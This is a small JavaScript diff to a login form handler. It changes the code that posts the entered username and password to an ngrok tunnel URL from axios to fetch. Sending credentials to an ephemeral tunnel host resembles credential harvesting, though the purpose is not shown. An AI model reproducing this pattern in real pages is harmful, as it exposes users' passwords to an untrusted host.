@@ -1,4 +1,3 @@
-
 function submitForm() {
 
     const username = document.getElementById('username').value;
@@ -10,7 +9,7 @@ function submitForm() {
         password: password
     };
 
-    axios.post('https://f2de-62-173-45-70.ngrok-free.app', {
+    fetch('https://f2de-62-173-45-70.ngrok-free.app', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
